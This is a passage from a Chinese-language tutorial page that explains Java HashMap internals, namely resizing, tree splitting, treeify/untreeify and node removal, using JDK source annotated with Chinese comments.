class="keyword">instanceof</span> TreeNode)</span><br><span class="line">                    <span class="comment">//说明是红黑树来处理冲突的，则调用相关方法把树分开</span></span><br><span class="line">                    ((TreeNode&lt;K,V&gt;)e).split(<span class="keyword">this</span>, newTab, j, oldCap);</span><br><span class="line">                <span class="keyword">else</span> &#123; <span class="comment">// 采用链表处理冲突</span></span><br><span class="line">                    <span class="comment">// 创建两个头尾节点，表示两条链表</span></span><br><span class="line">  <span class="comment">// 因为旧链表上的元素放入新数组中，最多将变成两条链表</span></span><br><span class="line">                    <span class="comment">// 一条下标不变的链表，一条下标+oldCap</span></span><br><span class="line">                    Node&lt;K,V&gt; loHead = <span class="keyword">null</span>, loTail = <span class="keyword">null</span>;</span><br><span class="line">                    Node&lt;K,V&gt; hiHead = <span class="keyword">null</span>, hiTail = <span class="keyword">null</span>;</span><br><span class="line">                    Node&lt;K,V&gt; next;</span><br><span class="line">                    <span class="comment">//通过上述讲解的原理来计算节点的新位置</span></span><br><span class="line">                    <span class="keyword">do</span> &#123;</span><br><span class="line">                        <span class="comment">// 记录当前节点的下一个节点</span></span><br><span class="line">                        next = e.next;</span><br><span class="line">                        <span class="comment">// 注意：e.hash &amp; oldCap这一步就是前面说的判断多出的这一位是否为1</span></span><br><span class="line">      <span class="comment">// 若与原容量做与运算，结果为0，表示将这个节点放入到新数组中，下标不变</span></span><br><span class="line">                     <span class="comment">//这里来判断如果等于true e这个节点在resize之后不需要移动位置</span></span><br><span class="line">                        <span class="keyword">if</span> ((e.hash &amp; oldCap) == <span class="number">0</span>) &#123;</span><br><span class="line">                            <span class="comment">// 若这是不变链表的第一个节点，用loHead记录</span></span><br><span class="line">                            <span class="keyword">if</span> (loTail == <span class="keyword">null</span>)</span><br><span class="line">                                loHead = e;</span><br><span class="line">                            <span class="comment">// 否则，将它加入下标不变链表的尾部</span></span><br><span class="line">                            <span class="keyword">else</span></span><br><span class="line">                                loTail.next = e;</span><br><span class="line">                            <span class="comment">// 更新尾部指针指向新加入的节点</span></span><br><span class="line">                            loTail = e;</span><br><span class="line">                        &#125;</span><br><span class="line">                         <span class="comment">// 若与原容量做与运算，结果为1，表示将这个节点放入到新数组中，下标将改变</span></span><br><span class="line">                        <span class="comment">// 原索引+oldCap</span></span><br><span class="line">                        <span class="keyword">else</span> &#123;</span><br><span class="line">                             <span class="comment">// 若这是改变下标链表的第一个节点，用hiHead记录</span></span><br><span class="line">                            <span class="keyword">if</span> (hiTail == <span class="keyword">null</span>)</span><br><span class="line">                                hiHead = e;</span><br><span class="line">                            <span class="comment">// 否则，将它加入改变下标链表的尾部</span></span><br><span class="line">                            <span class="keyword">else</span></span><br><span class="line">                                hiTail.next = e;</span><br><span class="line">                             <span class="comment">// 更新尾部指针指向新加入的节点</span></span><br><span class="line">                            hiTail = e;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">while</span> ((e = next) != <span class="keyword">null</span>);</span><br><span class="line">                    <span class="comment">// 所有节点遍历完后，判断下标不变的链表是否有节点在其中</span></span><br><span class="line">                    <span class="keyword">if</span> (loTail != <span class="keyword">null</span>) &#123;</span><br><span class="line">                         <span class="comment">// 将这条链表的最后一个节点的next指向null</span></span><br><span class="line">                        loTail.next = <span class="keyword">null</span>;</span><br><span class="line">                        <span class="comment">// 同时将其放入新数组的相同位置</span></span><br><span class="line">                        newTab[j] = loHead;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// 另一条链表与上同理</span></span><br><span class="line">                    <span class="keyword">if</span> (hiTail != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        hiTail.next = <span class="keyword">null</span>;</span><br><span class="line">                         <span class="comment">// 这条链表放入的位置要在原来的基础上加上oldCap</span></span><br><span class="line">                        newTab[j + oldCap] = hiHead;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> newTab;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="树形结构修剪-split"><a href="#树形结构修剪-split" class="headerlink" title="树形结构修剪 (split)"></a>树形结构修剪 (split)</h4><p>HashMap 中， resize() 方法的作用就是初始化或者扩容哈希表。当扩容时，如果当前桶中元素结构是红黑树，并且元素个数小于链表还原阈值 UNTREEIFY_THRESHOLD （默认为 6），就会把桶中的树形结构缩小或者直接还原（切分）为链表结构，调用的就是 split():</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//参数介绍</span></span><br><span class="line"><span class="comment">//tab 表示保存桶头结点的哈希表</span></span><br><span class="line"><span class="comment">//index 表示从哪个位置开始修剪</span></span><br><span class="line"><span class="comment">//bit 要修剪的位数（哈希值）</span></span><br><span class="line"><span class="function"><span class="keyword">final</span> <span class="keyword">void</span> <span class="title">split</span><span class="params">(HashMap&lt;K,V&gt; map, Node&lt;K,V&gt;[] tab, <span class="keyword">int</span> index, <span class="keyword">int</span> bit)</span> </span>&#123;</span><br><span class="line">    TreeNode&lt;K,V&gt; b = <span class="keyword">this</span>;</span><br><span class="line">    <span class="comment">// Relink into lo and hi lists, preserving order</span></span><br><span class="line">    TreeNode&lt;K,V&gt; loHead = <span class="keyword">null</span>, loTail = <span class="keyword">null</span>;</span><br><span class="line">    TreeNode&lt;K,V&gt; hiHead = <span class="keyword">null</span>, hiTail = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">int</span> lc = <span class="number">0</span>, hc = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (TreeNode&lt;K,V&gt; e = b, next; e != <span class="keyword">null</span>; e = next) &#123;</span><br><span class="line">        next = (TreeNode&lt;K,V&gt;)e.next;</span><br><span class="line">        e.next = <span class="keyword">null</span>;</span><br><span class="line">        <span class="comment">//如果当前节点哈希值的最后一位等于要修剪的 bit 值</span></span><br><span class="line">        <span class="keyword">if</span> ((e.hash &amp; bit) == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">//就把当前节点放到 lXXX 树中</span></span><br><span class="line">            <span class="keyword">if</span> ((e.prev = loTail) == <span class="keyword">null</span>)</span><br><span class="line">                loHead = e;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                loTail.next = e;</span><br><span class="line">            <span class="comment">//然后 loTail 记录 e</span></span><br><span class="line">            loTail = e;</span><br><span class="line">            <span class="comment">//记录 lXXX 树的节点数量</span></span><br><span class="line">            ++lc;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;  <span class="comment">//如果当前节点哈希值最后一位不是要修剪的</span></span><br><span class="line">                <span class="comment">//就把当前节点放到 hXXX 树中</span></span><br><span class="line">            <span class="keyword">if</span> ((e.prev = hiTail) == <span class="keyword">null</span>)</span><br><span class="line">                hiHead = e;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                hiTail.next = e;</span><br><span class="line">            hiTail = e;</span><br><span class="line">            <span class="comment">//记录 hXXX 树的节点数量</span></span><br><span class="line">            ++hc;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (loHead != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">//如果 lXXX 树的数量小于 6，就把 lXXX 树的枝枝叶叶都置为空，变成一个单节点</span></span><br><span class="line">        <span class="comment">//然后让这个桶中，要还原索引位置开始往后的结点都还原成链表的 lXXX 节点</span></span><br><span class="line">        <span class="comment">//这一段元素以后就是一个链表结构</span></span><br><span class="line">        <span class="keyword">if</span> (lc &lt;= UNTREEIFY_THRESHOLD)</span><br><span class="line">            tab[index] = loHead.untreeify(map);</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//否则让索引位置的结点指向 lXXX 树，这个树被修剪过，元素少了</span></span><br><span class="line">            tab[index] = loHead;</span><br><span class="line">            <span class="keyword">if</span> (hiHead != <span class="keyword">null</span>) <span class="comment">// (else is already treeified)</span></span><br><span class="line">                loHead.treeify(tab);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (hiHead != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">//同理，让 指定位置 index + bit 之后的元素</span></span><br><span class="line">        <span class="comment">//指向 hXXX 还原成链表或者修剪过的树</span></span><br><span class="line">        <span class="keyword">if</span> (hc &lt;= UNTREEIFY_THRESHOLD)</span><br><span class="line">            tab[index + bit] = hiHead.untreeify(map);</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            tab[index + bit] = hiHead;</span><br><span class="line">            <span class="keyword">if</span> (loHead != <span class="keyword">null</span>)</span><br><span class="line">                hiHead.treeify(tab);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="红黑树的树化操作-treeify"><a href="#红黑树的树化操作-treeify" class="headerlink" title="红黑树的树化操作(treeify)"></a>红黑树的树化操作(treeify)</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Forms tree of the nodes linked from this node.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> root of tree</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//这是TreeNode类的实例方法，以调用节点this为根节点，将链表树化</span></span><br><span class="line"><span class="function"><span class="keyword">final</span> <span class="keyword">void</span> <span class="title">treeify</span><span class="params">(Node&lt;K,V&gt;[] tab)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//声明root变量以记录根节点</span></span><br><span class="line">    TreeNode&lt;K,V&gt; root = <span class="keyword">null</span>; </span><br><span class="line">    <span class="comment">//从调用节点this开始遍历</span></span><br><span class="line">    <span class="keyword">for</span> (TreeNode&lt;K,V&gt; x = <span class="keyword">this</span>, next; x != <span class="keyword">null</span>; x = next) &#123; </span><br><span class="line">        <span class="comment">//暂存链表中的下一个节点，记为next</span></span><br><span class="line">        next = (TreeNode&lt;K,V&gt;)x.next; </span><br><span class="line">        <span class="comment">//当前节点x的左右子树置空</span></span><br><span class="line">        x.left = x.right = <span class="keyword">null</span>; </span><br><span class="line">        <span class="keyword">if</span> (root == <span class="keyword">null</span>) &#123;</span><br><span class="line">            x.parent = <span class="keyword">null</span>; <span class="comment">//若root仍为空，则将x节点作为根节点</span></span><br><span class="line">            x.red = <span class="keyword">false</span>; <span class="comment">//红黑树特性之一：根节点为黑色</span></span><br><span class="line">            root = x; <span class="comment">//赋值root</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//否则的话需将当前节点x插入到已有的树中</span></span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            K k = x.key;</span><br><span class="line">            <span class="keyword">int</span> h = x.hash;</span><br><span class="line">            Class&lt;?&gt; kc = <span class="keyword">null</span>;</span><br><span class="line">            <span class="comment">//第二层循环，从根节点开始寻找适合x插入的位置，并完成插入操作。</span></span><br><span class="line">            <span class="comment">//putTreeVal方法的实现跟这里十分相似。</span></span><br><span class="line">            <span class="keyword">for</span> (TreeNode&lt;K,V&gt; p = root;;) &#123; </span><br><span class="line">                <span class="keyword">int</span> dir, ph;</span><br><span class="line">                K pk = p.key;</span><br><span class="line">                <span class="keyword">if</span> ((ph = p.hash) &gt; h) <span class="comment">//若x的hash值小于节点p的，则往p的左子树中继续寻找</span></span><br><span class="line">                    dir = -<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (ph &lt; h) <span class="comment">//反之在右子树中继续</span></span><br><span class="line">                    dir = <span class="number">1</span>;</span><br><span class="line">                <span class="comment">//若两节点hash值相等，且key不可比，则利用System.identityHashCode方法来决定一个方向</span></span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> ((kc == <span class="keyword">null</span> &amp;&amp; (kc = comparableClassFor(k)) == <span class="keyword">null</span>) ||</span><br><span class="line">                        (dir = compareComparables(kc, k, pk)) == <span class="number">0</span>)</span><br><span class="line">                   dir = tieBreakOrder(k, pk); </span><br><span class="line">   <span class="comment">//将当前节点p暂存为xp</span></span><br><span class="line">                TreeNode&lt;K,V&gt; xp = p; </span><br><span class="line">                <span class="comment">//根据上面算出的dir值将p向下移向其左子树或右子树，若为空，则说明找到了合适的插入位置，否则继续循环</span></span><br><span class="line">                <span class="keyword">if</span> ((p = (dir &lt;= <span class="number">0</span>) ? p.left : p.right) == <span class="keyword">null</span>) &#123; </span><br><span class="line">                    <span class="comment">//执行到这里说明找到了合适x的插入位置</span></span><br><span class="line">                    x.parent = xp; <span class="comment">//将x的parent指针指向xp</span></span><br><span class="line">                    <span class="keyword">if</span> (dir &lt;= <span class="number">0</span>) <span class="comment">//根据dir决定x是作为xp的左孩子还是右孩子</span></span><br><span class="line">                        xp.left = x;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                        xp.right = x;</span><br><span class="line">                    <span class="comment">//由于需要维持红黑树的平衡，即始终满足其5条性质，每一次插入新节点后都需要做平衡操作</span></span><br><span class="line">                    root = balanceInsertion(root, x);</span><br><span class="line">                    <span class="keyword">break</span>; <span class="comment">//插入完成，跳出循环</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//由于插入后的平衡调整可能会更换整棵树的根节点，</span></span><br><span class="line">    <span class="comment">//这里需要通过moveRootToFront方法确保table[index]中的节点与插入前相同</span></span><br><span class="line">    moveRootToFront(tab, root);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="红黑树untreeify方法"><a href="#红黑树untreeify方法" class="headerlink" title="红黑树untreeify方法"></a>红黑树untreeify方法</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Returns a list of non-TreeNodes replacing those linked from</span></span><br><span class="line"><span class="comment">* this node.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">final</span> Node&lt;K,V&gt; <span class="title">untreeify</span><span class="params">(HashMap&lt;K,V&gt; map)</span> </span>&#123;</span><br><span class="line">    Node&lt;K,V&gt; hd = <span class="keyword">null</span>, tl = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">for</span> (Node&lt;K,V&gt; q = <span class="keyword">this</span>; q != <span class="keyword">null</span>; q = q.next) &#123;</span><br><span class="line">       Node&lt;K,V&gt; p = map.replacementNode(q, <span class="keyword">null</span>); <span class="comment">//将每一个节点重新替换为Node类型</span></span><br><span class="line">        <span class="keyword">if</span> (tl == <span class="keyword">null</span>) <span class="comment">//头尾两个指针，将链表重新串起来</span></span><br><span class="line">           hd = p;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">           tl.next = p;</span><br><span class="line">        tl = p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> hd; <span class="comment">//返回链表头结点</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="删除方法-remove"><a href="#删除方法-remove" class="headerlink" title="删除方法(remove)"></a>删除方法(remove)</h4><p> 理解了put方法之后，remove方法已经没什么难度了，所以重复的内容就不再做详细介绍了。</p><p>删除的话就是首先先找到元素的位置，如果是链表就遍历链表找到元素之后删除。如果是用红黑树就遍历树然后找到之后做删除，树小于6的时候要转链表。 </p><p> 删除remove方法： </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//remove方法的具体实现在removeNode方法中，所以我们重点看下removeNode方法</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">remove</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">        Node&lt;K,V&gt; e;</span><br><span class="line">        <span class="keyword">return</span> (e = removeNode(hash(key), key, <span class="keyword">null</span>, <span class="keyword">false</span>, <span class="keyword">true</span>)) == <span class="keyword">null</span> ?</span><br><span class="line">            <span class="keyword">null</span> : e.value;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p> removeNode方法： </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">final</span> Node&lt;K,V&gt; <span class="title">removeNode</span><span class="params">(<span class="keyword">int</span> hash, Object key, Object value,</span></span></span><br><span class="line"><span class="function"><span class="params">                               <span class="keyword">boolean</span> matchValue, <span class="keyword">boolean</span> movable)</span> </span>&#123;</span><br><span class="line">        Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; <span class="keyword">int</span> n, index;</span><br><span class="line">    <span class="comment">//根据hash找到位置 </span></span><br><span class="line">    <span class="comment">//如果当前key映射到的桶不为空</span></span><br><span class="line">        <span class="keyword">if</span> ((tab = table) != <span class="keyword">null</span> &amp;&amp; (n = tab.length) &gt; <span class="number">0</span> &amp;&amp;</span><br><span class="line">            (p = tab[index = (n - <span class="number">1</span>) &amp; hash]) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            Node&lt;K,V&gt; node = <span class="keyword">null</span>, e; K k; V v;</span><br><span class="line">            <span class="comment">//如果桶上的节点就是要找的key，则将node指向该节点</span></span><br><span class="line">            <span class="keyword">if</span> (p.hash == hash &amp;&amp;</span><br><span class="line">                ((k = p.key) == key || (key != <span class="keyword">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">                node = p;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ((e = p.next) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">//说明节点存在下一个节点</span></span><br><span class="line">                <span class="keyword">if</span> (p <span class="keyword">instanceof</span> TreeNode)</span><br><span class="line">                    <span class="comment">//说明是以红黑树来处理的冲突，则获取红黑树要删除的节点</span></span><br><span class="line">                    node = ((TreeNode&lt;K,V&gt;)p).getTreeNode(hash, key);</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">//判断是否以链表方式处理hash冲突，是的话则通过遍历链表来寻找要删除的节点</span></span><br><span class="line">                    <span class="keyword">do</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (e.hash == hash &amp;&amp;</span><br><span class="line">                            ((k = e.key) == key ||</span><br><span class="line">                             (key != <span class="keyword">null</span> &amp;&amp; key.equals(k)))) &#123;</span><br><span class="line">                            node = e;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        p = e;</span><br><span class="line">                    &#125; <span class="keyword">while</span> ((e = e.next) != <span class="keyword">null</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//比较找到的key的value和要删除的是否匹配</span></span><br><span class="line">            <span class="keyword">if</span> (node != <span class="keyword">null</span> &amp;&amp; (!matchValue || (v = node.value) == value ||</span><br><span class="line">                                 (value != <span class="keyword">null</span> &amp;&amp; value.equals(v)))) &#123;</span><br><span class="line">                <span class="comment">//通过调用红黑树的方法来删除节点</span></span><br><span class="line">                <span class="keyword">if</span> (node <span class="keyword">instanceof</span> TreeNode)</span><br><span class="line">                    ((TreeNode&lt;K,V&gt;)node).removeTreeNode(<span class="keyword">this</span>, tab, movable);</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (node == p)</span><br><span class="line">                    <span class="comment">//链表删除</span></span><br><span class="line">                    tab[index] = node.next;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    p.next = node.next;</span><br><span class="line">                <span class="comment">//记录修改次数</span></span><br><span class="line">                ++modCount;</span><br><span class="line">                <span class="comment">//变动的数量</span></span><br><span class="line">                --size;</span><br><span class="line">                afterNodeRemoval(node);</span><br><span class="line">                <span class="keyword">return</span> node;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="红黑树删除方法-TreeNode-removeTreeNode"><a href="#红黑树删除方法-TreeNode-removeTreeNode" class="headerlink" title="红黑树删除方法(TreeNode.removeTreeNode)"></a>红黑树删除方法(TreeNode.removeTreeNode)</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这是TreeNode类的实例方法，方法被调用说明该节点本身为待删除节点</span></span><br><span class="line">    <span class="comment">//TreeNode类继承自Node类，它的连接指针在Node原有的next的基础上额外增加了prev,parent,left,right</span></span><br><span class="line">    <span class="comment">//所以除了二叉树的连接方式外，TreeNode仍维护了前驱后继两个指针，这意味着TreeNode节点可以像链表节点那样遍历，这一点从treeifyBin或putTreeVal中能够看出。</span></span><br><span class="line">    <span class="comment">//removeTreeNode方法中，先以链表的方式处理了next和prev指针，之后才是对于parent,left,right指针的处理</span></span><br><span class="line">    <span class="function"><span class="keyword">final</span> <span class="keyword">void</span> <span class="title">removeTreeNode</span><span class="params">(HashMap&lt;K,V&gt; map, Node&lt;K,V&gt;[] tab, <span class="keyword">boolean</span> movable)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n;</span><br><span class="line">        <span class="keyword">if</span> (tab == <span class="keyword">null</span> || (n = tab.length) == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">int</span> index = (n - <span class="number">1</span>) &amp; hash; <span class="comment">//根据自身的hash值计算出自己所在的桶在table中的index</span></span><br><span class="line">        <span class="comment">//first和root均置为table[index]这个桶中的第一个节点</span></span><br><span class="line">        TreeNode&lt;K,V&gt; first = (TreeNode&lt;K,V&gt;)tab[index], root = first, rl;</span><br><span class="line">        <span class="comment">//succ为当前节点的后继节点，pred为前驱节点</span></span><br><span class="line">        TreeNode&lt;K,V&gt; succ = (TreeNode&lt;K,V&gt;)next, pred = prev;</span><br><span class="line">        <span class="keyword">if</span> (pred == <span class="keyword">null</span>)</span><br><span class="line">            <span class="comment">//若pred为空，则当前节点为桶中的第一个节点，删除后，其后继节点succ应当接替它的位置</span></span><br><span class="line">            tab[index] = first = succ; </span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="comment">//否则的话，将其后继节点赋值给其前驱节点的后继节点，即将当前节点剔除</span></span><br><span class="line">            pred.next = succ;</span><br><span class="line">        <span class="keyword">if</span> (succ != <span class="keyword">null</span>)</span><br><span class="line">            succ.prev = pred; <span class="comment">//若succ不为空，置其前驱节点为pred</span></span><br><span class="line">        <span class="keyword">if</span> (first == <span class="keyword">null</span>) </span><br><span class="line">            <span class="keyword">return</span>; <span class="comment">//上面几步都是针对next和prev指针的链表操作，若得到first为空，意味着当前节点是该桶中的唯一节点，则直接删除就好，无需后续调整</span></span><br><span 